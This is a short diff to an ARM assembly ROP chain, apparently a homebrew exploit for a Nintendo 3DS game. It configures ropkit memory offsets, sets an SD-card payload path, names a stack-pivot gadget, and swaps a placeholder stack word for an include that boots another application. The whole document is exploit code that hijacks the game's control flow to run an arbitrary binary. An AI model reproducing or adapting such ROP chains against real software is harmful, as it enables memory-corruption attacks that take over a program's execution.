@@ -4,6 +4,16 @@
 
 _start:
 
+#define ROPKIT_LINEARMEM_BUF (0x14000000+0x2000000)
+
+#define ROPKIT_APPMEM_TEXT_OFFSET 0x7900000
+
+//Only works with the game's exheader patched for enabling SD access.
+#define ROPKIT_BINPAYLOAD_PATH "sd:/payload.bin"
+#define ROPKIT_MOUNTSD
+
+#include "ropkit_ropinclude.s"
+
 //STACKPIVOT_ADR: "ldm r4, {ip, sp, lr, pc}"
 //ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ: Call vtable funcptr +0x10 from the r5 object.
 
@@ -43,7 +53,7 @@ pivotdata:
 .word ROP_POPPC @ pc
 
 ropstackstart:
-.word 0x40506070
+#include "ropkit_boototherapp.s"
 
 .space ((_start + 0x26b0) - .)
 
